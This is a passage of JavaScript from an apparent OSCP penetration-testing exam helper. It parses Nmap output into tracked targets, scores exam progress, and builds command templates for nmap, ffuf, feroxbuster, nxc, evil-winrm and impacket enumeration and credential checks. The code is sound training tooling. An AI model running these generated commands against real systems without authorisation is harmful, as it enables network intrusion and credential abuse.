function renderSessionStats(){const s=$('#sessionStats');if(s)s.textContent=`${targets.length} targets · ${credentials.length} credentials · ${favorites.length} favorites · ${targets.reduce((n,t)=>n+(t.path?.length||0),0)} attack-path steps`;const st=$('#storageSummary');if(st)st.innerHTML=`<div class="row"><div><div class="opsMetric">${targets.length}</div><div class="opsMetricLabel">targets</div></div><div><div class="opsMetric">${credentials.length}</div><div class="opsMetricLabel">credentials</div></div><div><div class="opsMetric">${favorites.length}</div><div class="opsMetricLabel">pins</div></div><div><div class="opsMetric">${preflightData?.tools?.length||0}</div><div class="opsMetricLabel">preflight tools</div></div></div>`}
$('#clearV7Ops').onclick=()=>{if(!confirm('CLEAR ALL targets, credentials, favorites and preflight from this browser? A secret-free recovery snapshot will be created first.'))return;snapshotNow('before clear operations state');['targets','credentials','favorites','preflight','activeTarget'].forEach(k=>safeStoreRemove(STORE+k));targets=[];credentials=[];favorites=[];preflightData=null;activeTargetId='';sessionSecrets={};sessionCredentialSecrets={};renderTargets();renderAllV7();toast('Operations state cleared — recovery snapshot retained')};

function renderAllV7(){renderOpsSelectors();renderWorkspace();renderCredentialMatrix();renderGraph();renderReport();renderFavorites();renderActiveSummary();renderPreflight();renderSessionStats()}
$('#addTarget').onclick=()=>{const t=newTarget();targets.push(t);activeTargetId=t.id;saveTargets();renderTargets();renderAllV7()};
$('#exportTargets').onclick=()=>downloadText('oscp-targets.json',JSON.stringify({app:'OSCP-V19-Targets',version:19,exported:new Date().toISOString(),targets:targets.map(t=>({...t,creds:''}))},null,2),'application/json');
function validateTargetImportObject(o){
 if(!o||!Array.isArray(o.targets)||o.targets.some(x=>!x||typeof x!=='object'||!validRecordId(String(x.id||''))))throw new Error('targets missing or invalid target ID');
 const ids=o.targets.map(x=>String(x.id));if(new Set(ids).size!==ids.length)throw new Error('duplicate target IDs');return o.targets;
}
function prepareTargetImport(incoming){const nextSecrets={},nextTargets=incoming.map(upgradeTarget);nextTargets.forEach(t=>{if(t.creds)nextSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});return{targets:nextTargets,secrets:nextSecrets}}
$('#importTargets').onchange=async e=>{const f=e.target.files[0];if(!f)return;try{assertImportFileSize(f,'Target backup');const o=JSON.parse(await f.text()),incoming=validateTargetImportObject(o);if(typeof snapshotNow==='function')snapshotNow('before target-only import');const prepared=prepareTargetImport(incoming);sessionSecrets=prepared.secrets;targets=prepared.targets;activeTargetId=targets[0]?.id||'';saveTargets();renderTargets();renderAllV7();toast('Targets imported')}catch(err){alert('Invalid target JSON: '+(err?.message||'validation failed'))}finally{e.target.value=''}};



const oldSwitchView=switchView;
switchView=function(id){oldSwitchView(id);if(id==='workspaceView')renderWorkspace();if(id==='credentialsView')renderCredentialMatrix();if(id==='graphView')renderGraph();if(id==='reportsView')renderReport();if(id==='sessionView'){renderPreflight();renderSessionStats()}};


/* ===== V8 Scan Intake / Command Builder / Exam Board / Timeline ===== */
const V8_SERVICE_MAP={
  21:{name:'FTP',tag:'[PORT:21]'},22:{name:'SSH',tag:'[PORT:22]'},23:{name:'TELNET',tag:'[PORT:23]'},25:{name:'SMTP',tag:'[PORT:25]'},
  53:{name:'DNS',tag:'[PORT:53]'},80:{name:'HTTP',tag:'[WEB:ENUM]'},88:{name:'KERBEROS',tag:'[AD:KERBEROS]'},110:{name:'POP3',tag:'[PORT:110]'},
  111:{name:'RPC',tag:'[PORT:111]'},135:{name:'MSRPC',tag:'[PORT:135]'},139:{name:'NETBIOS',tag:'[PORT:445]'},143:{name:'IMAP',tag:'[PORT:143]'},
  161:{name:'SNMP',tag:'[PORT:161]'},389:{name:'LDAP',tag:'[AD:LDAP]'},443:{name:'HTTPS',tag:'[WEB:ENUM]'},
  445:{name:'SMB',tag:'[PORT:445]'},465:{name:'SMTP',tag:'[PORT:25]'},587:{name:'SMTP',tag:'[PORT:25]'},636:{name:'LDAPS',tag:'[AD:LDAP]'},873:{name:'RSYNC',tag:'[PORT:873]'},1433:{name:'MSSQL',tag:'[PORT:1433]'},
  1521:{name:'ORACLE',tag:'[PORT:1521]'},2049:{name:'NFS',tag:'[LINUX:NFS]'},2375:{name:'DOCKER',tag:'[PORT:2375]'},2376:{name:'DOCKER',tag:'[PORT:2375]'},3268:{name:'LDAP',tag:'[AD:LDAP]'},3269:{name:'LDAPS',tag:'[AD:LDAP]'},3306:{name:'MYSQL',tag:'[PORT:3306]'},
  3389:{name:'RDP',tag:'[PORT:3389]'},5432:{name:'POSTGRES',tag:'[PORT:5432]'},5900:{name:'VNC',tag:'[PORT:5900]'},5985:{name:'WINRM',tag:'[PORT:5985]'},
  5986:{name:'WINRM-HTTPS',tag:'[PORT:5985]'},6379:{name:'REDIS',tag:'[PORT:6379]'},8080:{name:'HTTP-ALT',tag:'[WEB:ENUM]'},9200:{name:'ELASTICSEARCH',tag:'[PORT:9200]'},
  8443:{name:'HTTPS-ALT',tag:'[WEB:ENUM]'},993:{name:'IMAP',tag:'[PORT:143]'},995:{name:'POP3',tag:'[PORT:110]'},27017:{name:'MONGODB',tag:'[PORT:27017]'}
};
/* Canonicalize services from BOTH port and Nmap service/product text. OSCP targets
   often put HTTP/SSH/databases on non-standard ports; port-only routing can hide
   an exposed surface and falsely inflate coverage. */
function canonicalServiceName(p){
 const port=+p?.port||0,text=`${p?.service||''} ${p?.product||''} ${p?.extra||''}`.toLowerCase();
 // Prefer an explicit Nmap/banner service identity over the conventional port.
 // OSCP targets deliberately move services; port 443 can be SSH and port 22 can be HTTP.
 if(/docker(?:\s|$)|docker api/.test(text))return'DOCKER';
 if(/elasticsearch/.test(text))return'ELASTICSEARCH';
 if(/pop3/.test(text))return'POP3';
 if(/imap/.test(text))return'IMAP';
 if(/microsoft-ds|netbios-ssn|\bsmb\b/.test(text))return'SMB';
 if(/\bssh\b/.test(text))return'SSH';
 if(/\bftp\b/.test(text))return'FTP';
 if(/\bsmtp\b/.test(text))return'SMTP';
 if(/globalcatldap|ldaps|\bldap\b/.test(text))return'LDAP';
 if(/\bmsrpc\b|\bdcerpc\b|endpoint mapper|\bepmap\b/.test(text))return'MSRPC';
 if(/wsman|winrm/.test(text))return'WINRM';
 if(/ms-wbt-server|\brdp\b/.test(text))return'RDP';
 if(/ms-sql-s|mssql/.test(text))return'MSSQL';
 if(/postgres|postgresql/.test(text))return'POSTGRES';
 if(/mysql/.test(text))return'MYSQL';
 if(/redis/.test(text))return'REDIS';
 if(/mongodb/.test(text))return'MONGODB';
 if(/\bsnmp\b/.test(text))return'SNMP';
 if(/\bnfs\b|mountd/.test(text))return'NFS';
 if(/\bvnc\b/.test(text))return'VNC';
 if(/telnet/.test(text))return'TELNET';
 if(/rsync/.test(text))return'RSYNC';
 if(/oracle|tns/.test(text))return'ORACLE';
 if(/kerberos/.test(text))return'KERBEROS';
 // Nmap commonly labels WSMan as generic http/https on 5985/5986; preserve the
 // protocol unless the banner identified a different specific service above.
 if((port===5985||port===5986)&&/(?:https?|httpapi|wsman|winrm)/.test(text))return'WINRM';
 if(/(?:^|\s)(?:https?|ssl\/http|http-proxy|http-alt)(?:\s|$)|web server/.test(text))return'WEB';
 // DNS/domain is intentionally late because the word "domain" can appear in unrelated product text.
 if(/^(?:domain|dns)(?:\s|$)|\bdns\b/.test(text))return'DNS';
 const fixed=V8_SERVICE_MAP[port]?.name||'';
 return {HTTP:'WEB',HTTPS:'WEB','HTTP-ALT':'WEB','HTTPS-ALT':'WEB',NETBIOS:'SMB',LDAPS:'LDAP','WINRM-HTTPS':'WINRM',RPC:'RPCBIND'}[fixed]||fixed;
}

let scanPreviewHosts=[];
const OSCP_PASS_TARGET=70;
let boardConfig=safeStoredRecord(STORE+'boardConfig',{passTarget:OSCP_PASS_TARGET});
boardConfig={...boardConfig,passTarget:OSCP_PASS_TARGET};
let selectedCmdTemplate='triage';

function normalizePortRecord(p){
 if(!p||typeof p!=='object'||Array.isArray(p))return null;
 const port=Number.parseInt(String(p.port),10);if(!Number.isInteger(port)||port<1||port>65535)return null;
 const clean=(v,max=240)=>String(v??'').replace(/[\u0000-\u001f\u007f]/g,' ').trim().slice(0,max),rawProto=clean(p.proto||'tcp',12).toLowerCase(),proto=/^[a-z0-9_-]{1,12}$/.test(rawProto)?rawProto:'tcp',rawState=clean(p.state||'open',24).toLowerCase(),state=/^(?:open|open\|filtered|filtered|closed)$/.test(rawState)?rawState:'open';
 return{port,proto,state,service:clean(p.service,100),product:clean(p.product,240),version:clean(p.version,160),extra:clean(p.extra,240)};
}
function upgradeV8Target(t){
 t=upgradeTarget(t);
 t.ports=Array.isArray(t.ports)?t.ports.map(normalizePortRecord).filter(Boolean):[];
 t.timeline=Array.isArray(t.timeline)?t.timeline:[];
 t.pointsPossible=Number.isFinite(+t.pointsPossible)?+t.pointsPossible:0;
 t.pointsAwarded=Number.isFinite(+t.pointsAwarded)?+t.pointsAwarded:0;
 t.lastActivity=t.lastActivity||t.updated||Date.now();
 return t;
}
targets=targets.map(upgradeV8Target);
const v8OriginalNewTarget=newTarget;
newTarget=function(){return upgradeV8Target(v8OriginalNewTarget())};

/* V9 migration safety: use V7 only as a fallback when no real V8 state exists. */
const v9HasV8State=(()=>{try{const x=JSON.parse(localStorage.getItem('oscp_v8_targets')||'[]');return Array.isArray(x)&&x.length>0}catch(e){return false}})();
if(!targets.length&&!v9HasV8State){
 try{
  const oldTargets=JSON.parse(localStorage.getItem('oscp_v7_targets')||'[]');
  if(Array.isArray(oldTargets)&&oldTargets.length){
    targets=oldTargets.map(upgradeV8Target);
    const oldCred=JSON.parse(localStorage.getItem('oscp_v7_credentials')||'[]');
    const oldFav=JSON.parse(localStorage.getItem('oscp_v7_favorites')||'[]');
    if(!credentials.length&&Array.isArray(oldCred))credentials=oldCred;
    if(!favorites.length&&Array.isArray(oldFav))favorites=oldFav;
    const oldActive=localStorage.getItem('oscp_v7_activeTarget');
    activeTargetId=oldActive&&targets.some(t=>t.id===oldActive)?oldActive:targets[0].id;
    targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});
    safeStoreSet(STORE+'targets',JSON.stringify(targets));
    toast('Legacy target state migrated');
  }
 }catch(e){}
}
function logEvent(t,type,text,meta={}){
 if(!t)return;
 t.timeline=t.timeline||[];
 t.timeline.push({id:(crypto.randomUUID?crypto.randomUUID():Date.now()+'-'+Math.random()),at:Date.now(),type,text,meta});
 if(t.timeline.length>250)t.timeline=t.timeline.slice(-250);
 t.lastActivity=Date.now();t.updated=Date.now();
}
function portLabel(p){return `${p.port}/${p.proto||'tcp'} ${p.service||''}${p.product?' · '+p.product:''}${p.version?' '+p.version:''}`.trim()}
function inferFromPorts(host){
 const open=(host.ports||[]).filter(p=>p.state!=='closed'),nums=new Set(open.map(p=>+p.port)),services=new Set(open.map(canonicalServiceName).filter(Boolean));
 const signals=[],tags=[];
 let role='unknown';
 if(services.has('WEB')){signals.push('web');tags.push('[WEB:ENUM]')}
 if(nums.has(88)&&nums.has(389)&&nums.has(445)&&nums.has(53)){role='dc';signals.push('domain-creds');tags.push('[AD:FLOW]')}
 else if(['SMB','RDP','WINRM'].some(x=>services.has(x))){role='windows'}
 else if(['SSH','NFS'].some(x=>services.has(x))){role='linux'}
 if(services.has('NFS'))tags.push('[LINUX:NFS]');
 if(services.has('SMB'))tags.push('[PORT:445]');
 if(services.has('WINRM'))tags.push('[PORT:5985]');
 return {role,signals:[...new Set(signals)],tags:[...new Set(tags)]};
}
function parseNmapXML(text){
 const doc=new DOMParser().parseFromString(text,'application/xml');
 if(doc.querySelector('parsererror'))throw new Error('Invalid XML');
 return [...doc.querySelectorAll('host')].map(h=>{
   const addr=h.querySelector('address[addrtype="ipv4"]')?.getAttribute('addr')||h.querySelector('address')?.getAttribute('addr')||'';
   const host=h.querySelector('hostnames hostname')?.getAttribute('name')||'';
   const ports=[...h.querySelectorAll('ports port')].map(p=>{
     const svc=p.querySelector('service'),state=p.querySelector('state')?.getAttribute('state')||'';
     return {port:+p.getAttribute('portid'),proto:p.getAttribute('protocol')||'tcp',state,
       service:svc?.getAttribute('name')||'',product:svc?.getAttribute('product')||'',version:svc?.getAttribute('version')||'',extra:svc?.getAttribute('extrainfo')||''};
   }).filter(p=>p.state==='open'||p.state==='open|filtered');
   return {ip:addr,host,ports};
 }).filter(h=>h.ip);
}
function parseGrepable(text){
 const out=[];
 for(const line of text.split(/\r?\n/)){
  if(!line.startsWith('Host:')||!line.includes('Ports:'))continue;
  const m=line.match(/^Host:\s+(\S+)\s+\((.*?)\).*?Ports:\s+(.+)$/);if(!m)continue;
  const ports=m[3].split(',').map(x=>x.trim()).map(x=>{const f=x.split('/');return {port:+f[0],state:f[1],proto:f[2]||'tcp',service:f[4]||'',product:(f[6]||'').trim(),version:''}}).filter(p=>p.state==='open'||p.state==='open|filtered');
  out.push({ip:m[1],host:m[2]||'',ports});
 }
 return out;
}
function parseNormalNmapFixed(text){
 const out=[];let cur=null;
 for(const raw of text.split(/\r?\n/)){
  const line=raw.trimEnd();
  let m=line.match(/^Nmap scan report for (?:(.*?) \()?((?:\d{1,3}\.){3}\d{1,3})(?:\))?$/);
  if(m){cur={ip:m[2],host:(m[1]||'').trim(),ports:[]};out.push(cur);continue}
  if(!cur)continue;
  m=line.match(/^(\d+)\/(tcp|udp)\s+(open(?:\|filtered)?)\s+(\S+)(?:\s+(.*))?$/);
  if(m)cur.ports.push({port:+m[1],proto:m[2],state:m[3],service:m[4],product:m[5]||'',version:''});
 }
 return out;
}
function parseIPList(text){
 const seen=new Set(),out=[];
 for(const line of text.split(/\r?\n/)){const v=line.trim().split(/\s+/)[0];if(/^(?:\d{1,3}\.){3}\d{1,3}$/.test(v)&&!seen.has(v)){seen.add(v);out.push({ip:v,host:'',ports:[]})}}
 return out;
}
function parseScanText(text){
 text=String(text??'');if(text.length>MAX_TEXT_INTAKE_CHARS)throw new Error('Scan input exceeds the 10 MB text safety limit');const s=text.trim();if(!s)return[];
 let hosts=[];
 if(s.startsWith('<?xml')||s.includes('<nmaprun')){hosts=parseNmapXML(s)}
 else if(s.includes('Host:')&&s.includes('Ports:')){hosts=parseGrepable(s)}
 else if(s.includes('Nmap scan report for')){hosts=parseNormalNmapFixed(s)}
 else hosts=parseIPList(s);
 hosts.forEach(h=>Object.assign(h,inferFromPorts(h)));return hosts;
}
function mergeScanPreview(list){
 const map=new Map(scanPreviewHosts.map(h=>[h.ip,h]));
 list.forEach(h=>{
  const old=map.get(h.ip);
  if(!old)map.set(h.ip,h);
  else{const pm=new Map((old.ports||[]).map(p=>[p.proto+':'+p.port,p]));(h.ports||[]).forEach(p=>pm.set(p.proto+':'+p.port,p));old.ports=[...pm.values()];if(h.host)old.host=h.host;Object.assign(old,inferFromPorts(old))}
 });
 scanPreviewHosts=[...map.values()];renderScanPreview();
}
function renderScanPreview(){
 const root=$('#scanPreview'),stats=$('#scanStats');if(!root)return;
 const totalPorts=scanPreviewHosts.reduce((n,h)=>n+h.ports.length,0),dcs=scanPreviewHosts.filter(h=>h.role==='dc').length,web=scanPreviewHosts.filter(h=>h.signals.includes('web')).length;
 stats.innerHTML=`<div class="intakeStat"><b>${scanPreviewHosts.length}</b><br><span class="muted">hosts</span></div><div class="intakeStat"><b>${totalPorts}</b><br><span class="muted">open ports</span></div><div class="intakeStat"><b>${web}</b><br><span class="muted">web hosts</span></div><div class="intakeStat"><b>${dcs}</b><br><span class="muted">DC-like</span></div>`;
 $('#importScanTargets').disabled=!scanPreviewHosts.length;
 root.innerHTML=scanPreviewHosts.length?scanPreviewHosts.map(h=>`<div class="scanHost"><div class="row" style="justify-content:space-between"><div><b>${esc(h.ip)}</b>${h.host?` · ${esc(h.host)}`:''} <span class="chip">${esc(h.role)}</span></div><div class="chips">${(h.tags||[]).map(t=>`<span class="chip">${esc(t)}</span>`).join('')}</div></div><div class="portChips">${h.ports.length?h.ports.map(p=>`<span class="portChip ${[22,80,88,389,443,445,5985,2049].includes(+p.port)?'hot':''}">${esc(portLabel(p))}</span>`).join(''):'<span class="muted">No port data — IP-only import</span>'}</div></div>`).join(''):'No scan parsed.';
}
async function processScanFiles(files){for(const f of files){try{assertImportFileSize(f,'Scan input');mergeScanPreview(parseScanText(await f.text()))}catch(e){toast(`Could not parse ${f.name}: ${e.message}`)}}}
$('#scanFiles').onchange=e=>processScanFiles([...e.target.files]);
$('#parsePastedScan').onclick=()=>{try{mergeScanPreview(parseScanText($('#scanPaste').value))}catch(e){alert(e.message)}};
$('#clearScanPreview').onclick=()=>{scanPreviewHosts=[];$('#scanPaste').value='';renderScanPreview()};
const drop=$('#scanDrop');['dragenter','dragover'].forEach(ev=>drop.addEventListener(ev,e=>{e.preventDefault();drop.classList.add('drag')}));['dragleave','drop'].forEach(ev=>drop.addEventListener(ev,e=>{e.preventDefault();drop.classList.remove('drag')}));drop.addEventListener('drop',e=>processScanFiles([...e.dataTransfer.files]));
$('#importScanTargets').onclick=()=>{
 const merge=$('#scanMerge').checked,auto=$('#scanAutoSignals').checked,doLog=$('#scanAddTimeline').checked;let created=0,updated=0;
 scanPreviewHosts.forEach(h=>{
  let t=merge?targets.find(x=>x.ip===h.ip):null;
  if(!t){t=upgradeV8Target(newTarget());t.ip=h.ip;targets.push(t);created++}else updated++;
  if(h.host&&!t.host)t.host=h.host;
  const pm=new Map((t.ports||[]).map(p=>[p.proto+':'+p.port,p]));h.ports.forEach(p=>pm.set(p.proto+':'+p.port,p));t.ports=[...pm.values()].sort((a,b)=>a.port-b.port);
  if(t.ports.some(p=>p.proto==='tcp'))t.status.tcp=true;if(t.ports.some(p=>p.proto==='udp'))t.status.udp=true;
  if(auto){const inf=inferFromPorts(t);if(t.role==='unknown'||t.role==='web')t.role=inf.role==='unknown'&&h.signals.includes('web')?'web':inf.role;t.signals=[...new Set([...(t.signals||[]),...inf.signals])]}
  if(doLog)logEvent(t,'scan',`Imported scan: ${t.ports.map(p=>p.port+'/'+p.proto).join(', ')||'host discovered'}`);
 });
 if(!activeTargetId&&targets.length)activeTargetId=targets[0].id;saveTargets();renderTargets();renderAllV8();toast(`Scan imported: ${created} created, ${updated} updated`);
};

function resumeData(t){
 if(!t)return null;const recs=recommendActions(t),last=(t.timeline||[]).slice(-1)[0],ports=(t.ports||[]).filter(p=>p.state!=='closed');
 return {last,recs,ports,next:(t.next||[]).filter(Boolean)};
}
function resumeHTML(t){
 const r=resumeData(t);if(!r)return'<div class="muted">No active target.</div>';
 return `<div class="row" style="justify-content:space-between"><div><b>${esc(targetLabel(t))}</b> · ${esc(t.stage)} · <span class="conf ${confClass(t.confidence)}">${esc(confLabel(t.confidence))}</span></div><span class="tiny">${r.last?new Date(r.last.at).toLocaleTimeString():'no timeline yet'}</span></div>
 <div style="margin-top:8px"><b>Last change:</b> ${r.last?esc(r.last.text):'No recorded activity yet.'}</div>
 <div style="margin-top:8px"><b>Open:</b> ${r.ports.length?r.ports.slice(0,12).map(p=>`<span class="portChip">${esc(p.port+'/'+p.proto+' '+(p.service||''))}</span>`).join(' '):'<span class="muted">no imported ports</span>'}</div>
 <div style="margin-top:8px"><b>Resume with:</b><ol class="resumeNext">${(r.next.length?r.next:r.recs.slice(0,3).map(x=>x.title)).map(x=>`<li>${esc(x)}</li>`).join('')}</ol></div>`;
}
function renderTimeline(t){
 const root=$('#workspaceTimeline');if(!root||!t)return;const items=(t.timeline||[]).slice().reverse();
 root.innerHTML=items.length?items.map(e=>`<div class="timelineItem"><div class="timelineType">${esc(e.type)}</div><div>${esc(e.text)}</div><div class="timelineTime">${new Date(e.at).toLocaleString()}</div></div>`).join(''):'<div class="muted">No activity recorded yet.</div>';
}
$('#quickLogAdd').onclick=()=>{const t=activeTarget(),txt=$('#quickLogText').value.trim();if(!t||!txt)return;logEvent(t,$('#quickLogType').value,txt);$('#quickLogText').value='';saveTargets();renderWorkspace();renderBoard()};
function renderServices(t){
 const root=$('#workspaceServices');if(!root||!t)return;
 root.innerHTML=t.ports?.length?`<table class="serviceTable"><thead><tr><th>Port</th><th>Service</th></tr></thead><tbody>${t.ports.map(p=>`<tr><td>${esc(p.port)}/${esc(p.proto)}</td><td>${esc((p.service||'')+(p.product?' · '+p.product:'')+(p.version?' '+p.version:''))}</td></tr>`).join('')}</tbody></table>`:'No imported service data.';
}

/* Patch workspace rendering with resume/timeline/service data. */
const v8RenderWorkspaceBase=renderWorkspace;
renderWorkspace=function(){v8RenderWorkspaceBase();const t=activeTarget();if(!t)return;$('#workspaceResume').innerHTML=resumeHTML(t);renderTimeline(t);renderServices(t)};

/* Log common events. */
const v8AddFinding=$('#addFinding').onclick;
$('#addFinding').onclick=()=>{const before=activeTarget()?.findings?.length||0;v8AddFinding();const t=activeTarget();if(t&&t.findings.length>before){const f=t.findings.at(-1);logEvent(t,'finding',`Finding added: ${f.title}`);saveTargets();renderTimeline(t)}};
const v8AddPath=$('#addPath').onclick;
$('#addPath').onclick=()=>{const before=activeTarget()?.path?.length||0;v8AddPath();const t=activeTarget();if(t&&t.path.length>before){const p=t.path.at(-1);logEvent(t,p.type,`Attack path: ${p.label}`);saveTargets();renderTimeline(t)}};

/* Board */
function clampExamPoints(v){return window.OSCP_UTILS.clampExamPoints(v)}
function renderBoard(){
 boardConfig.passTarget=OSCP_PASS_TARGET;
 targets.forEach(t=>{t.pointsPossible=clampExamPoints(t.pointsPossible);t.pointsAwarded=Math.min(clampExamPoints(t.pointsAwarded),t.pointsPossible||100)});
 const awarded=targets.reduce((n,t)=>n+(+t.pointsAwarded||0),0),possible=targets.reduce((n,t)=>n+(+t.pointsPossible||0),0),need=Math.max(0,OSCP_PASS_TARGET-awarded);
 $('#boardAwarded').textContent=awarded;$('#boardPossible').textContent=possible;$('#boardRemaining').textContent=need;$('#boardScoreBar').style.width=Math.min(100,awarded/OSCP_PASS_TARGET*100)+'%';
 const sanity=[];if(possible>100)sanity.push(`Configured possible points total ${possible}, above the OSCP+ exam maximum of 100.`);if(awarded>100)sanity.push(`Recorded awarded estimate ${awarded}, above the exam maximum of 100.`);for(const t of targets)if((+t.pointsAwarded||0)>(+t.pointsPossible||0)&&(+t.pointsPossible||0)>0)sanity.push(`${targetLabel(t)} has awarded points above its configured possible points.`);
 const bs=$('#boardSanity');if(bs)bs.innerHTML=(sanity.length?`<b>⚠ Score-model sanity check</b><br>${sanity.map(esc).join('<br>')}<br>`:'')+`<span class="tiny"><b>Authority:</b> use the Exam Control Panel for each target's exact objectives and values. This board is only your local estimate; OSCP+ remains 100 total / 70 to pass.</span>`;
 $('#examBoard').innerHTML=targets.length?targets.map(t=>{const r=resumeData(t),age=t.lastActivity?Math.max(0,Math.floor((Date.now()-t.lastActivity)/60000)):0,miss=evidenceMissing(t);return `<div class="boardCard ${t.id===activeTargetId?'activeFocus':''}"><div class="row" style="justify-content:space-between"><div><b>${esc(targetLabel(t))}</b><div class="tiny">${esc(t.role)} · ${esc(t.stage)} · last change ${age}m ago</div></div><button class="btn boardFocus" data-tid="${esc(t.id)}">Focus</button></div><div class="row" style="margin-top:9px"><label>Possible <input class="boardPossibleInput" data-tid="${esc(t.id)}" type="number" min="0" max="100" value="${+t.pointsPossible||0}" style="width:65px"></label><label>Awarded <input class="boardAwardInput" data-tid="${esc(t.id)}" type="number" min="0" max="100" value="${+t.pointsAwarded||0}" style="width:65px"></label></div><div style="margin-top:9px"><b>Resume:</b> ${esc((r?.next?.[0]||r?.recs?.[0]?.title||'Enumerate / record next action'))}</div><div class="tiny" style="margin-top:7px">${miss.length?`Claimed-objective evidence missing: ${miss.length}`:'✅ claimed-objective evidence gate satisfied'}</div></div>`}).join(''):'<div class="card muted">No targets.</div>';
 $$('.boardFocus').forEach(b=>b.onclick=()=>{setActiveTarget(b.dataset.tid);switchView('workspaceView')});
 $$('.boardPossibleInput').forEach(x=>x.onchange=()=>{const t=targets.find(t=>t.id===x.dataset.tid);if(!t)return;t.pointsPossible=clampExamPoints(x.value);if(t.pointsAwarded>t.pointsPossible&&t.pointsPossible>0){t.pointsAwarded=t.pointsPossible;toast('Awarded estimate clamped to this target’s configured possible points')}saveTargets();renderBoard()});
 $$('.boardAwardInput').forEach(x=>x.onchange=()=>{const t=targets.find(t=>t.id===x.dataset.tid);if(!t)return;let v=clampExamPoints(x.value);if(t.pointsPossible>0&&v>t.pointsPossible){v=t.pointsPossible;toast('Awarded estimate cannot exceed this target’s configured possible points')}t.pointsAwarded=v;logEvent(t,'score',`Awarded point estimate set to ${t.pointsAwarded}`);saveTargets();renderBoard()});
 renderCockpitScore();
}
$('#openBoard').onclick=()=>{switchView('boardView');renderBoard()};
function renderCockpitScore(){const root=$('#cockpitScore');if(!root)return;const awarded=targets.reduce((n,t)=>n+(+t.pointsAwarded||0),0),goal=OSCP_PASS_TARGET;root.innerHTML=`<b>${awarded}</b> awarded / configured target <b>${goal}</b><div class="scoreBar" style="margin-top:7px"><div style="width:${Math.min(100,awarded/goal*100)}%"></div></div>`}

/* Command Builder */
const V8_CMD_SERVICES=['TRIAGE','NMAP','WEB','SMB','RPCBIND','MSRPC','NFS','WINRM','RDP','SSH','MSSQL','LDAP','KERBEROS','FILE TRANSFER'];
const V8_CMD_TEMPLATES={
 triage:{title:'Target triage',services:['TRIAGE'],make:(t,c,x)=>{const dst=cmdTarget(t),ports=openPorts(t);return[
  `nmap -n -Pn -sV --top-ports 100 -oA ${safeName(t)}-quick ${dst}`,
  `nmap -n -Pn -p- --min-rate 1000 -oA ${safeName(t)}-tcp ${dst} &`,
  ...(ports?[`nmap -n -Pn -sC -sV -p ${ports} -oA ${safeName(t)}-services ${dst}`]:['# Enumerate quick-scan services while the full scan runs; import/record open ports to add the focused service scan automatically.'])
 ]}},
 nmap:{title:'Focused Nmap',services:['NMAP'],make:(t,c,x)=>{const dst=cmdTarget(t),name=safeName(t);return[
  `nmap -n -Pn -sC -sV -p ${openPorts(t)||'<OPEN_PORTS>'} -oA ${name}-services ${dst}`,
  `sudo nmap -n -Pn -sU --top-ports 50 -oA ${name}-udp-top50 ${dst}`
 ]}},
 web:{title:'Web enumeration',services:['WEB'],make:(t,c,x)=>{const override=String(x||'').trim().replace(/^https?:\/\//i,'').replace(/\/.*$/,'').replace(/:\d+$/,''),base=override?{...t,host:override}:t,urls=webSurfaceUrls(base,false),ipUrls=webSurfaceUrls(t,true),domain=override||settings.DOMAIN||'domain.local',lines=[];urls.forEach((url,i)=>{let resolved='';if(override&&t?.ip){try{const u=new URL(url),port=u.port||((u.protocol==='https:')?'443':'80');resolved=`curl -ki --resolve ${shQuote(`${u.hostname}:${port}:${t.ip}`)} ${shQuote(url)}`}catch(_){}}lines.push(`whatweb ${shQuote(url)}`,resolved||`curl -ki ${shQuote(url)}`,`feroxbuster -u ${shQuote(url)} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`);const ipUrl=ipUrls[i]||url;lines.push(`ffuf -u ${shQuote(ipUrl)} -H ${shQuote('Host: FUZZ.'+domain)} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`)});return lines}},

 smb:{title:'SMB validation',services:['SMB'],make:(t,c,x)=>credCommands(t,c,'SMB',[
  `nxc smb {TARGET} -u {U} -p {P}`,
  `nxc smb {TARGET} -u {U} -p {P} --shares`,
  `smbclient -L {SMB_TARGET} -U {UP}`
 ])},
 rpcbind:{title:'RPCbind enumeration',services:['RPCBIND'],make:(t,c,x)=>{const dst=cmdTarget(t),name=safeName(t);return[
  `rpcinfo -p ${dst}`,
  `nmap -n -Pn -p 111 --script rpcinfo -oA ${name}-rpcbind ${dst}`
 ]}},
 msrpc:{title:'MSRPC endpoint mapper',services:['MSRPC'],make:(t,c,x)=>{const dst=cmdTarget(t),name=safeName(t);return[
  `impacket-rpcdump ${dst}`,
  `nmap -n -Pn -p 135 --script msrpc-enum -oA ${name}-msrpc ${dst}`
 ]}},
 nfs:{title:'NFS enumeration',services:['NFS'],make:(t,c,x)=>{const dst=cmdTarget(t),name=safeName(t);return[
  `showmount -e ${dst}`,
  `nmap -n -Pn -p 2049 --script nfs-showmount,nfs-ls,nfs-statfs -oA ${name}-nfs ${dst}`
 ]}},
 winrm:{title:'WinRM validation',services:['WINRM'],make:(t,c,x)=>credCommands(t,c,'WINRM',[
  `nxc winrm {TARGET} -u {U} -p {P}`,
  `evil-winrm -i {TARGET} -u {U} -p {P}`
 ])},
 rdp:{title:'RDP validation',services:['RDP'],make:(t,c,x)=>credCommands(t,c,'RDP',[
  `nxc rdp {TARGET} -u {U} -p {P}`
 ])},
 ssh:{title:'SSH',services:['SSH'],make:(t,c,x)=>credCommands(t,c,'SSH',[
  `ssh {SSH_PORT}{SSH_TARGET}`
 ])},
 mssql:{title:'MSSQL',services:['MSSQL'],make:(t,c,x)=>credCommands(t,c,'MSSQL',[
  `nxc mssql {TARGET} -u {U} -p {P}`,
  `impacket-mssqlclient {MSSQL_TARGET} -windows-auth`
 ])},
 ldap:{title:'LDAP',services:['LDAP'],make:(t,c,x)=>{
  const uri=ldapURIForTarget(t),base=normalizeBaseDN(x||settings.DOMAIN);
  const out=[`ldapsearch -x -H ${uri} -s base namingContexts`];
  if(!c)return out;
  const ident=credentialIdentity(c),type=String(c.type||'password').toLowerCase();
  if(ident.scope==='local'){out.push('# Local SAM credential selected: LDAP authenticates domain identities. Use a local-auth protocol path instead.');return out}
  if(ident.scope==='application'){out.push('# Application-scoped credential selected: do not reinterpret it as an LDAP/domain password.');return out}
  if(type==='ntlm'){out.push('# NTLM hash selected: simple ldapsearch cannot use pass-the-hash. Use a hash-capable AD client for the exact LDAP task or obtain a Kerberos ticket first.');return out}
  if(type!=='password'){out.push(`# ${type} material selected: use the Credential Material Router for the correct LDAP authentication path.`);return out}
